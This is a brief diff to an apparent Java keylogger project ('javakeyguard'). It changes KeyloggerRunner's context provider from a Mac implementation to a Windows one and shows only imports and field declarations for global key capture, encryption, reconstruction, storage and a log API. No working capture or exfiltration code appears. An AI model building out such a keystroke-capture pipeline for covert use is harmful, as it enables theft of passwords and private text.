@@ -5,7 +5,7 @@ import com.github.kwhat.jnativehook.NativeHookException;
 import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
 import com.keyguard.javakeyguard.api.LogApiService;
 import com.keyguard.javakeyguard.keylogger.capture.GlobalKeyListener;
-import com.keyguard.javakeyguard.keylogger.context.MacContextProvider;
+import com.keyguard.javakeyguard.keylogger.context.WindowsContextProvider;
 import com.keyguard.javakeyguard.keylogger.encryption.EncryptionService;
 import com.keyguard.javakeyguard.keylogger.reconstruction.ReconstructionService;
 import com.keyguard.javakeyguard.keylogger.storage.LogStorageService;
@@ -28,7 +28,7 @@ public class KeyloggerRunner {
     private final EncryptionService encryptionService;
     private final ReconstructionService reconstructionService;
     private final LogStorageService logStorageService;
-    private final MacContextProvider contextProvider;
+    private final WindowsContextProvider contextProvider;
     private final LogApiService logApiService;
 
     private final AtomicLong idGenerator = new AtomicLong(1);
